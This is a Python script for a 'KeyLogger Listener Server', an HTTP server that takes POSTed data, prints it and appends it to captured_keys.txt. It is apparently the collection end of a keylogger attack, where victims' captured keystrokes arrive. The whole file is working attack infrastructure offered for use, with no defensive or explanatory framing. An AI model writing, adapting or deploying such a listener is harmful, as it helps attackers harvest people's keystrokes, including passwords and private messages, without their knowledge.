import http.server
import socketserver
import argparse

class KeyloggerHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        # Read content length
        content_length = int(self.headers['Content-Length'])
        # Read payload
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        # Log to file
        with open("captured_keys.txt", "a") as f:
            f.write(post_data + "\n")
            
        print(f"[*] Received Data: {post_data}")
        
        # Send response
        self.send_response(200)
        self.end_headers()

def main():
    parser = argparse.ArgumentParser(description='KeyLogger Listener Server')
    parser.add_argument('-p', '--port', type=int, default=8080, help='Listening Port (default: 8080)')
    parser.add_argument('-i', '--ip', default='0.0.0.0', help='Listening IP (default: 0.0.0.0)')
    
    args = parser.parse_args()
    
    print(f"[*] Starting KeyLogger Server on {args.ip}:{args.port}...")
    print("[*] Waiting for reports...")
    
    with socketserver.TCPServer((args.ip, args.port), KeyloggerHandler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[!] Server stopped.")
            httpd.server_close()

if __name__ == "__main__":
    main()
